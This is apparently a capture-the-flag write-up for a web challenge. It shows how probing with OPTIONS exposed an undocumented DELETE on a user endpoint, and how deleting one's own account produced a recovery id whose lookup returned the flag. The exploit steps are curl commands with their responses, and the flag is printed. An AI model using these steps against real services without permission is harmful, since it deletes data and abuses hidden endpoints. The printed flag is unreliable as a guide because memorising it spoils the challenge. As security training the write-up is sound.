# tabadabort

- **Category:** Web
- **Target:** `http://tabadabort.challs.crate.nu/`
- **Prompt:** *"Review your personal account on tabadabort's website."*
- **Flag:** `cratectf{ovanlig_http_metod}` ("unusual HTTP method")

## Challenge
"Meridian Ops Intranet — Identity Services". The account page just calls
`GET /api/users/me` → `{id: 6113, username, status: "active", …}`. No visible actions.

## Recon
The client [`app.js`](app.js) leaks a developer TODO:

> `// Backend's already live though -- DELETE grace period via GET /api/recovery/ with recovery id`

Probing methods confirms the hidden capability:

```
OPTIONS /api/users/me      -> Allow: OPTIONS, DELETE, GET, HEAD
OPTIONS /api/recovery/x    -> Allow: OPTIONS, GET, HEAD
GET /api/recovery/me       -> {"error":"Invalid or expired recovery token."}
```

Direct IDOR by id is closed (`/api/users/<n>` → 404); only `me` resolves. The attack surface is
the **undocumented `DELETE`** (the "unusual HTTP method") + the recovery flow.

## Exploit
```bash
# 1) Delete own account (soft-delete, 20-min grace period) -> returns a recovery id
curl -s -X DELETE http://tabadabort.challs.crate.nu/api/users/me
# {"message":"Account purged. ... recover within 20 minutes via GET /api/recovery/RCV-54B32757A8",
#  "recovery_id":"RCV-54B32757A8","status":"deleted"}

# 2) Hit the recovery endpoint -> returns the flag
curl -s http://tabadabort.challs.crate.nu/api/recovery/RCV-54B32757A8
# {"flag":"cratectf{ovanlig_http_metod}","message":"Account successfully recovered."}
```

The account is your own and the delete is recoverable (grace period), on an isolated per-user
instance — the recovery call is the intended win condition and is repeatable.

## Flag
```
cratectf{ovanlig_http_metod}
```

## Lesson
Don't let the UI bound your attack surface — enumerate what methods a resource actually accepts
(`OPTIONS`). And don't ship destructive, auth-light flows (self-delete + a guessable `RCV-…`
recovery id reachable by a plain `GET`).

## Files
- `app.js` — the client JS that leaked the DELETE/recovery TODO
